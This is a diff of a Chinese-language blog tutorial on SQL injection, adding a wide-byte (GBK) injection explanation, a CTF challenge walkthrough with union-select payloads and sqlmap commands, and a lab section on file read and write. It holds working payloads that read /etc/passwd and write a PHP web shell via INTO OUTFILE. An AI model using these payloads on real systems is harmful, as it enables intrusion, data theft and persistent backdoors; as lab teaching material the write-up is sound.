@@ -81,6 +81,10 @@ permalink:
 6.获取表中的字段名 
 7.显示字段信息
 
+
+
+![手工注入流程](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200608143317.png)
+
 ### 2 实现完整手工注入
 
 **靶机：DVWA**
@@ -143,7 +147,7 @@ $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';
 ![](https://i.loli.net/2019/07/07/5d2157a15b62731652.png)
 说明执行的SQL语句为select First name,Surname from xx where ID='id'
 
-**理解select 1,2**：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结：果。
+**理解select 1,2**：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。[SELECT 1,2,3...的含义及其在SQL注入中的用法](https://blog.csdn.net/weixin_44840696/article/details/89166154)
 
 #### 4.获取当前数据库
 
@@ -862,6 +866,276 @@ database_name()
 **获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本，就不赘述了**
 
 
+## 宽字节注入
+
+### 原理
+
+> 宽字节注入是利用mysql的一个特性，`mysql在使用GBK编码的时候，会认为两个字符是一个汉字`【前一个ascii码要大于`128`，才到汉字的范围】
+
+在PHP配置文件中`magic_quotes_gpc=On`或者使用`addslashes`函数，`icov`函数,`mysql_real_escape_string`函数、`mysql_escape_string`函数等，提交的参数中如果带有单引号`'`，就会被自动转义`\'`，这样就使得多数注入攻击无效。
+
+当输入单引号，假设这里我们使用`addslashes`转义，对应的url编码是：
+**`'` -->`\'`--> `%5c%27`**
+当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：
+**`%df'` --> `%df\'` --> `(%df%5C)%27`-->`(数据库GBK)`-->`運'`**
+
+| %5c%27                                                       | %df%5C%27                                                    |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| ![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200608094626.png) | ![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200608094630.png) |
+
+前端输入**`%df'`**时首先经过上面**`addslashes`**函数和浏览器**`url编码`**转义变成了**`%df%5c%27`**
+
+因为数据库使用`GBK`编码的话，**%df%5c会被当作一个汉字处理,转换成了汉字"運"**，从而使`%27`（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。
+
+[在线GBK汉字编码字符集对照表](http://www.jsons.cn/gbkcode)
+
+### CG-CTF---GBK Injection
+
+#### 手工注入
+
+题目地址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
+
+```sql
+?id=1
+'''
+your sql:select id,title from news where id = '1'
+here is the information
+'''
+```
+输入`1'`可以看到`'`被变成了`\'`,应该是`addslashes`之类的函数转义的结果。
+```sql
+?id=1'
+'''
+your sql:select id,title from news where id = '1\''
+here is the information    
+'''
+```
+
+用上文宽字节构造方法，构造id=1%df'或者id=1%aa'，成功报错
+
+```sql
+?id=1%df'
+或者【只要ASCII大于128的字符就可以】
+?id=1%aa'
+‘’‘
+your sql:select id,title from news where id = '1ß\''
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10
+’‘’
+```
+
+**确定字段数**
+
+```sql
+?id=1%aa' order by 1 --+	正常
+?id=1%aa' order by 2 --+	正常
+?id=1%aa' order by 3 --+	报错
+’‘’
+所以字段数为2
+‘’‘
+```
+
+**确定显示位**
+
+前面必须为-1【前面查出来的值为null，才能显示后面我们想要的信息】，后面的信息才能显示出来
+
+```sql
+?id=-1%aa' union select 1,2  --+
+'''
+your sql:select id,title from news where id = '-1歿'union select 1,2 -- '
+2
+'''
+```
+
+确定了回显的位置是2
+
+**查询信息**
+
+```objectivec
+#查询数据库
+?id=-1%aa' union select 1,database()  --+
+'''
+sae-chinalover
+'''
+    
+#查询表名
+?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+'''
+ctf,ctf2,ctf3,ctf4,news
+'''  
+    
+#查询字段名
+?id=-1%aa' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+
+
+'''这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
+id,flag
+'''
+#查询字段信息
+?id=-1%aa' union select 1,group_concat(id,0x3a,flag) from ctf4 --+
+'''
+1:flag{this_is_sqli_flag}
+'''
+    
+?id=-1%aa' union select 1,group_concat(content) from ctf2 --+     
+'''
+h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r    
+'''    
+```
+
+有2个flag，成功得到flag
+
+#### **使用sqlmap**
+**方法一：**普通方法,根据提示选择选项
+
+```sql
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" --dbs
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  --tables
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  -T --columns
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover -T ctf4 -C flag --dump
+
+
+```
+
+**方法二：**使用脚本：`unmagicquotes.py`【作用：宽字符绕过】
+
+```sql
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes --dbs
+'''
+available databases [2]:                                                                       [*] information_schema
+[*] sae-chinalover
+'''
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes -D sae-chinalover --tables
+'''
+Database: sae-chinalover
+[6 tables]
++---------+
+| ctf     |
+| ctf2    |
+| ctf3    |
+| ctf4    |
+| gbksqli |
+| news    |
++---------+
+'''
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 --columns
+'''
+Database: sae-chinalover                                                                                                   
+Table: ctf4
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(100) |
+| id     | int(10)      |
++--------+--------------+
+'''
+
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 -C flag --dump
+'''
+Database: sae-chinalover
+Table: ctf4
+[1 entry]
++-------------------------+
+| flag                    |
++-------------------------+
+| flag{this_is_sqli_flag} |
++-------------------------+
+'''
+```
+
+**方法三**：直接查询flag字段
+
+```sql
+sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag
+--level 3 --risk 1 --thread 10
+'''
+--threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10
+--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
+--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+--search //后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样
+'''
+```
+
+## 报错注入
+
+待更。。。
+
+## 二次注入
+
+待更。。。
+
+## 堆叠注入
+
+待更。。。
+
+## Cookie 注入
+
+待更。。。
+
+## XFF注入
+
+待更。。。
+
+## 读写文件
+
+#### 读取文件函数
+
+`load_file（file_name）`：读取文件并返回该文件内容作为一个字符串。
+
+**使用前提：**
+
+- 必须有权限读取并且文件必须完全可读
+- 必须指定文件完整路径
+- 能够使用union查询（sql注入时）
+- 对Web目录有写权限用户必须有secure_file_priv=文件权限
+- 欲读取文件必须小于max_allowed_packetde的允许值
+
+**secure_file_priv的值**
+
+| 设置                   | 含义                                      |
+| ---------------------- | ----------------------------------------- |
+| secure_file_prive=null | 限制mysql不允许导入/导出                  |
+| secure_file_priv=/tmp/ | 限制mysql的导入/导出只能发生在/tmp/目录下 |
+| secure_file_priv=      | 不限制mysql的导入/导出                    |
+
+#### 写文件函数
+
+`into outfile`
+
+### 实现
+
+靶机：sqli-labs第7关
+
+```mysql
+#查看页面变化，判断sql注入类别
+?id=1 and 1=1 
+?id=1 and 1=2
+#You are in.... Use outfile......
+
+#确定字段数
+?id=1' order by 3 --+
+?id=1')) order by 4  --+
+#联合查询查看显示位
+?id=-1 union select 1,2,3
+
+?id=-1')) union select 1,load_file('/etc/passwd'),3 --+
+
+?id=-1')) union select 1,('<?php @eval($_POST["pass"])?>'),3  into outfile "/var/www/html/a.php"--+
+```
+
+### sqlmap读取文件
+
+--file-read用法用于读取本地文件
+
+```
+python sqlmap.py -u "http://xxx/x?id=1" --file-read=/etc/passwd
+```
 
 ## SQL注入靶场
 
